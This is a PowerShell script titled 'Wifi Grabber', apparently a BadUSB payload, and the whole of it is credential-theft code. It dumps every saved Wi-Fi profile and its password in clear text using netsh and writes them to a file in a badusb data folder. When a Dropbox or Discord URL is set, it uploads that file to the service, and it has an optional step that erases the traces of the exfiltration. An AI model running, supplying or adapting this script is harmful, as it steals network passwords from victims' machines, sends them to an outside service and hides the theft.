# Wifi Grabber

# Get wifi profiles and passwords
$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | ForEach-Object {
    $name=$_.Matches.Groups[1].Value.Trim()
    netsh wlan show profile name="$name" key=clear
} | Select-String "Key Content\W+\:(.+)$" | ForEach-Object {
    $pass=$_.Matches.Groups[1].Value.Trim()
    [PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }
} | Format-Table -AutoSize | Out-String

# Save wifi profiles to data.txt file in /badusb/data directory
$wifiProfiles | Out-File -Encoding utf8 -FilePath "$($env:USERPROFILE)\Documents\badusb\data\data.txt"

# Upload output file to Dropbox or Discord if the URLs are provided
if (-not ([string]::IsNullOrEmpty($db))) {
    Write-Host "Uploading to Dropbox..."
    DropBox-Upload -f "$($env:USERPROFILE)\Documents\badusb\data\data.txt"
    Write-Host "Upload to Dropbox completed"
}

if (-not ([string]::IsNullOrEmpty($dc))) {
    Write-Host "Uploading to Discord..."
    Upload-Discord -file "$($env:USERPROFILE)\Documents\badusb\data\data.txt"
    Write-Host "Upload to Discord completed"
}

# Clean exfiltration traces if the option is specified
if (-not ([string]::IsNullOrEmpty($ce))) {
    Write-Host "Cleaning exfiltration traces..."
    Clean-Exfil
    Write-Host "Exfiltration traces removed"
}
